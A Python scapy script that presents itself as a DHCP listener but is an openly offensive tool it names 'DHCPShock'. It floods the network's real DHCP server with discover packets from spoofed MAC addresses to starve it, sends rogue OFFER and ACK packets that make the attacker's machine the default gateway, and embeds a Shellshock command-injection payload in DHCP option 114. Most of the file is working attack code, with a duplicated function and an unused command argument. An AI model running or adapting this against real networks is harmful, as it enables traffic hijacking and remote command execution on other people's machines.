#!/usr/bin/env python3
"""scapy-dhcp-listener.py
Listen for DHCP packets using scapy to learn when LAN
hosts request IP addresses from DHCP Servers.
Copyright (C) 2019 Shamiul Hasan
License MIT
"""

from __future__ import print_function

import argparse
import binascii

from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import multiprocessing
import subprocess
import time

__version__ = "0.0.3"

parser = argparse.ArgumentParser(description='DHCPShock', epilog='Shock dem shells!')
parser.add_argument('-i', '--iface', type=str, required=True, help='Interface to use')
parser.add_argument('-c', '--cmd', type=str, help='Command to execute [default: "echo pwned"]')

args = parser.parse_args()

command = args.cmd or "echo 'pwned'"


# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):
    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else:
                    return i[1]
    except:
        pass


my_real_ip = '192.168.0.10'
broadcast_ip = '255.255.255.255'
fake_my_ip = '192.168.0.31'
fake_your_ip = '192.168.0.70'
fake_server_ip = my_real_ip
fake_subnet_mask = '255.255.255.0'
fake_router_ip = my_real_ip  # default gateway
fake_lease_time = 192800
fake_renewal_time = 186400
fake_rebinding_time = 138240
ipPool = list();


def dhcp_discover(dst_mac="ff:ff:ff:ff:ff:ff"):
    src_mac = get_if_hwaddr(conf.iface)
    spoofed_mac = RandMAC()
    options = [("message-type", "discover"),
               ("max_dhcp_size", 1500),
               ("client_id", mac2str(spoofed_mac)),
               ("lease_time", 10000),
               ("end", "0")]
    transaction_id = random.randint(1, 900000000)
    dhcp_request = Ether(src=src_mac, dst=dst_mac) \
                   / IP(src="0.0.0.0", dst="255.255.255.255") \
                   / UDP(sport=68, dport=67) \
                   / BOOTP(chaddr=[mac2str(spoofed_mac)],
                           xid=transaction_id,
                           flags=0xFFFFFF) \
                   / DHCP(options=options)
    sendp(dhcp_request,
          iface=conf.iface)


def dhcp_discover(dst_mac="ff:ff:ff:ff:ff:ff"):
    src_mac = get_if_hwaddr(conf.iface)
    spoofed_mac = RandMAC()
    options = [("message-type", "discover"),
               ("max_dhcp_size", 1500),
               ("client_id", mac2str(spoofed_mac)),
               ("lease_time", 10000),
               ("end", "0")]
    transaction_id = random.randint(1, 900000000)

    dhcp_request = Ether(src=src_mac, dst=dst_mac) \
                   / IP(src="0.0.0.0", dst="255.255.255.255") \
                   / UDP(sport=68, dport=67) \
                   / BOOTP(chaddr=[mac2str(spoofed_mac)],
                           xid=transaction_id,
                           flags=0xFFFFFF) \
                   / DHCP(options=options)
    sendp(dhcp_request,
          iface=conf.iface)


def pinger(job_q, results_q):
    DEVNULL = open(os.devnull, 'w')
    while True:

        ip = job_q.get()

        if ip is None:
            break

        try:
            subprocess.check_call(['ping', '-c1', ip],
                                  stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass


def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def map_network(pool_size=255):
    ip_list = list()

    # get my IP and compose a base like 192.168.1.xxx
    global my_real_ip;
    my_real_ip = get_my_ip();
    ip_parts = my_real_ip.split('.')
    base_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.'

    # prepare the jobs queue
    jobs = multiprocessing.Queue()
    results = multiprocessing.Queue()

    pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]

    for p in pool:
        p.start()

    # cue hte ping processes
    for i in range(1, 255):
        jobs.put(base_ip + '{0}'.format(i))

    for p in pool:
        jobs.put(None)

    for p in pool:
        p.join()

    # collect he results
    while not results.empty():
        ip = results.get()
        ip_list.append(ip)

    return ip_list


def assignIPDynamically():
    global ipPool, fake_your_ip;

    ipPool = map_network();

    print(ipPool)

    ipPool = sorted(ipPool)

    print(ipPool)

    lastIP = ipPool[-1];

    print(lastIP)

    splitted = lastIP.split('.');

    splitted[3] = str(int(splitted[3]) + 1);

    fake_your_ip = splitted[0] + "." + splitted[1] + "." + splitted[2] + "." + splitted[3];

    ipPool.append(fake_your_ip);

    print("FAKE IP " + fake_your_ip);


def assignNext():
    global ipPool, fake_your_ip;
    print(ipPool)

    lastIP = ipPool[-1];

    print(lastIP)

    splitted = lastIP.split('.');

    splitted[3] = str(int(splitted[3]) + 1);

    fake_your_ip = splitted[0] + "." + splitted[1] + "." + splitted[2] + "." + splitted[3];

    ipPool.append(fake_your_ip)

    print("FAKE IP " + fake_your_ip);


def make_dhcp_offer_packet(raw_mac, xid):
    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
              IP(src=fake_my_ip, dst=broadcast_ip) /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
              DHCP(options=[("message-type", "offer"),
                            ('server_id', fake_server_ip),
                            ('subnet_mask', fake_subnet_mask),
                            ('router', fake_router_ip),
                            ('lease_time', fake_lease_time),
                            ('renewal_time', fake_renewal_time),
                            ('rebinding_time', fake_rebinding_time),
                            "end"]))

    return packet


def make_dhcp_ack_packet(raw_mac, xid, command):
    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
              IP(src=fake_my_ip, dst='255.255.255.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=fake_your_ip, siaddr=fake_server_ip, xid=xid) /
              DHCP(options=[("message-type", "ack"),
                            ('server_id', fake_server_ip),
                            ('subnet_mask', fake_subnet_mask),
                            ('router', fake_router_ip),
                            ('lease_time', fake_lease_time),
                            ('renewal_time', fake_renewal_time),
                            ('rebinding_time', fake_rebinding_time),
                            (114, b"() { ignored;}; " + b"echo \'pwned\'"),
                            "end"]))

    return packet


def send_rogue_dhcp_offer_packet(packet):
    mac_addr = packet[Ether].src
    raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

    xid = packet[BOOTP].xid
    print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))

    print('\n\n\nMY OFFER packet on BUILD \n\n\n')

    new_packet = make_dhcp_offer_packet(raw_mac, xid)
    # print('New Packet data is:')
    # print(new_packet.show())
    print("\n[*] Sending Rogue OFFER...")
    sendp(new_packet, iface=args.iface)

    print('\n\n\n  Rogue OFFER packet SENT \n\n\n')

    return


def send_rogue_dhcp_ACK_packet(packet):
    mac_addr = packet[Ether].src
    raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

    xid = packet[BOOTP].xid
    print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))

    print('\n\n\n Rogue ACK packet on BUILD \n\n\n')

    new_packet = make_dhcp_ack_packet(raw_mac, xid, command)

    # print('New Packet data is:')
    # print(new_packet.show())
    print("\n[*] Sending ACK...")
    sendp(new_packet, iface=args.iface)
    print('\n\n\n Rogue ACK packet SENT \n\n\n')

    return


def handle_dhcp_packet(packet):
    # print hexdump(packet)

    global fake_your_ip;
    # Match DHCP discover
    if DHCP in packet and packet[DHCP].options[0][1] == 1:
        print('---')
        print('New GOOD DHCP Discover')
        hostname = get_option(packet[DHCP].options, 'hostname')
        print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")

        # Sending rogue offer packet
        send_rogue_dhcp_offer_packet(packet)

    # Match DHCP offer
    elif DHCP in packet and packet[DHCP].options[0][1] == 2:
        print('---')
        print('New GOOD DHCP Offer')
        # print(packet.summary())
        # print(ls(packet))

        subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
        lease_time = get_option(packet[DHCP].options, 'lease_time')
        router = get_option(packet[DHCP].options, 'router')
        name_server = get_option(packet[DHCP].options, 'name_server')
        domain = get_option(packet[DHCP].options, 'domain')

        print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
              f"offered {packet[BOOTP].yiaddr}")

        print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
              f"{lease_time}, router: {router}, name_server: {name_server}, "
              f"domain: {domain}")

    # Match DHCP request
    elif DHCP in packet and packet[DHCP].options[0][1] == 3:
        print('---')
        print('New GOOD DHCP Request')
        # print(packet.summary())
        # print(ls(packet))

        requested_addr = get_option(packet[DHCP].options, 'requested_addr')
        hostname = get_option(packet[DHCP].options, 'hostname')
        print(f"Host {hostname} ({packet[Ether].src}) requested {requested_addr}")

        # sending rogue ack packet
        send_rogue_dhcp_ACK_packet(packet)

    # Match DHCP ack
    elif DHCP in packet and packet[DHCP].options[0][1] == 5:
        print('---')
        print('New GOOD DHCP Ack')
        # print(packet.summary())
        # print(ls(packet))

        subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
        lease_time = get_option(packet[DHCP].options, 'lease_time')
        router = get_option(packet[DHCP].options, 'router')
        name_server = get_option(packet[DHCP].options, 'name_server')

        print(f"DHCP Server {packet[IP].src} ({packet[Ether].src}) "
              f"acked {packet[BOOTP].yiaddr}")

        print(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: "
              f"{lease_time}, router: {router}, name_server: {name_server}")

    # Match DHCP inform
    elif DHCP in packet and packet[DHCP].options[0][1] == 8:
        print('---')
        print('New GOOD DHCP Inform')
        # print(packet.summary())
        # print(ls(packet))

        hostname = get_option(packet[DHCP].options, 'hostname')
        vendor_class_id = get_option(packet[DHCP].options, 'vendor_class_id')

        print(f"DHCP Inform from {packet[IP].src} ({packet[Ether].src}) "
              f"hostname: {hostname}, vendor_class_id: {vendor_class_id}")

    else:
        print('---')
        print('Some Other DHCP Packet')
        # print(packet.summary())
        # print(ls(packet))

    # print('Packet data is:')
    # print(packet.show())

    assignNext();

    print("FAKE FAKE IP " + fake_your_ip)

    return


if __name__ == "__main__":
    print("Started starvation")
    coount = 1;
    while (coount < 20):
        dhcp_discover()
        coount += 1;
    time.sleep(15)
    print("DISCOVERING")
    assignIPDynamically()
    print("Started spoofing")
    sniff(iface=args.iface, filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
